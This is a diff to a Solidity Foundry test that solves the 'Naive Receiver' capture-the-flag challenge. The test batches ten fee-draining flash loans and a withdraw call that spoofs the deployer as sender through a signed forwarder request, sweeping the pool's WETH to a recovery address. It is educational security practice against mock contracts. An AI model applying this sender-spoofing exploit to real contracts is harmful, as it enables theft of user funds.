@@ -3,9 +3,9 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
-import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
-import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/mocks/NaiveReceiverPool.sol";
+import {FlashLoanReceiver} from "../../src/naive-receiver/mocks/FlashLoanReceiver.sol";
+import {BasicForwarder} from "../../src/naive-receiver/mocks/BasicForwarder.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -78,11 +78,35 @@ contract NaiveReceiverChallenge is Test {
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
         console.log("Player WETH balance: ", weth.balanceOf(player));
-        for (uint8 i = 0; i < 10; i++) {
-            pool.flashLoan(receiver, address(weth), 0, "");
+        bytes[] memory callDatas = new bytes[](11);
+
+        // Encode flash loan calls - on behalf of the Naive receiver
+        for (uint256 i = 0; i < 10; i++) {
+            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
         }
+
+        // Encode withdrawal call
+        // Exploit the access control vulnerability by passing the request through the forwarder
+        // And setting the deployer as sender in the last 20 bytes (That's how the pool parses it)
+        callDatas[10] = abi.encodePacked(
+            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            bytes32(uint256(uint160(deployer)))
+        );
+
+        bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);
+
+        BasicForwarder.Request memory dataType =
+            BasicForwarder.Request(player, address(pool), 0, gasleft(), 0, multicallData, block.timestamp);
+
+        bytes32 message =
+            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(dataType)));
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, message);
+        forwarder.execute(dataType, abi.encodePacked(r, s, v));
+
         console.log("Pool WETH balance: ", weth.balanceOf(address(pool)));
         console.log("Receiver WETH balance: ", weth.balanceOf(address(receiver)));
+        console.log("Recovery WETH balance: ", weth.balanceOf(address(recovery)));
     }
 
     /**
